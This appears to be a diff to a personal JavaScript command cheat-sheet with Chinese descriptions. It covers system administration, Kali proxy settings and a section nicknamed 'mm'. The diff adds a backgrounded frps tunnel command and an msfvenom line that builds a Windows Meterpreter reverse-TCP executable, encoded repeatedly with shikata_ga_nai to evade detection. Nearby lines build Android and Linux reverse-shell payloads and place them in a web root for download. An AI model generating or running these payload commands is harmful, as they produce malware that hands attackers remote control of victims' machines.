@@ -253,6 +253,12 @@
       //其他命令
       { command: 'echo "net.ipv6.conf.eth0.disable_ipv6 = 1" >> /etc/sysctl.conf || sysctl -p', description: '禁用IPv6' },
       { command: '[ "$(id -u)" -eq 0 ] || { echo "You must be root to run the script"; exit 1; }', description: '检查是否是root用户' },   
+      { command: 'nohup ./frps -c frps.ini &disown', description: '后台运行某个服务程序，ssh断开后会继续运行' },   
+
+
+      
+
+
       //kali修改代理配置
       { command: 'vim /etc/proxychains4.conf', description: 'kali凯丽修改代理配置' },
       { command: 'socket 192.168.1.210 10808', description: 'kali凯丽修改代理配置' },
@@ -390,7 +396,7 @@
       //mm生成
       { command: 'msfvenom -p android/meterpreter_reverse_tcp lhost=192.168.1.53 lport=4444 R -o /var/www/html/an.apk', description: '安卓美美-mm生成' },
       { command: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 -b "\0x00" -f elf -o /var/www/html/mkn-ghost', description: 'linux美美-mm生成' },
-
+      { command: 'msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai  -i 10 -f exe -o windowsmm.exe', description: 'windows美美-mm生成' },
 
       //经典名句
       { command: '周星驰：“我以为凭我们的交情，可以讲点感情，没想到还是一笔买卖。”', description: '周星驰' },
